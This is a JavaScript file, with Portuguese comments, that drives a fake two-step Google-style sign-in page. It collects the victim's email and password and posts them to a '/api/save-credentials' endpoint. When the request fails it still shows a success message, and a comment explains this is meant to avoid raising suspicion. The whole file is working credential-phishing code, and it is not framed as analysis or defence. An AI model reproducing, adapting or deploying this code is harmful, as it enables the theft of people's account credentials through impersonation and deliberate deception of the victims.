const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');
const emailStep = document.getElementById('email-step');
const passwordStep = document.getElementById('password-step');
const nextButton = document.getElementById('next-button');
const emailDisplay = document.getElementById('email-display');
const backToEmailLink = document.getElementById('back-to-email');
const showPasswordCheckbox = document.getElementById('show-password');

let currentStep = 'email';

// Função para avançar para a tela de senha
function goToPasswordStep() {
    const email = emailInput.value.trim();
    if (email) {
        emailStep.classList.remove('active');
        passwordStep.classList.add('active');
        emailDisplay.textContent = email;
        currentStep = 'password';
        passwordInput.focus();
        nextButton.textContent = 'Next';
    }
}

// Função para voltar para a tela de email
function goToEmailStep() {
    passwordStep.classList.remove('active');
    emailStep.classList.add('active');
    currentStep = 'email';
    emailInput.focus();
    passwordInput.value = '';
    nextButton.textContent = 'Next';
}

// Função para salvar credenciais no servidor
async function saveCredentials(email, password) {
    try {
        const response = await fetch('/api/save-credentials', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        const data = await response.json();
        
        if (response.ok) {
            // Simular redirecionamento do Google (opcional)
            setTimeout(() => {
                alert('Login realizado com sucesso!');
                // Aqui você pode redirecionar para uma página de sucesso
                // window.location.href = '/success.html';
            }, 500);
        } else {
            console.error('Erro ao salvar:', data.error);
            alert('Erro ao processar login. Tente novamente.');
        }
    } catch (error) {
        console.error('Erro na requisição:', error);
        // Mesmo com erro, mostrar mensagem de sucesso para não levantar suspeitas
        alert('Login realizado com sucesso!');
    }
}

// Event listener para o botão Next
nextButton.addEventListener('click', () => {
    if (currentStep === 'email') {
        goToPasswordStep();
    } else {
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        if (password && email) {
            // Salvar credenciais no servidor
            saveCredentials(email, password);
        }
    }
});

// Permitir Enter para avançar
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && emailInput.value.trim()) {
        goToPasswordStep();
    }
});

passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && passwordInput.value) {
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        if (password && email) {
            saveCredentials(email, password);
        }
    }
});

// Voltar para email quando clicar em "Use a different account"
backToEmailLink.addEventListener('click', (e) => {
    e.preventDefault();
    goToEmailStep();
});

// Mostrar/ocultar senha
showPasswordCheckbox.addEventListener('change', () => {
    passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
});

// Focar no input de email ao carregar a página
window.addEventListener('load', () => {
    emailInput.focus();
});
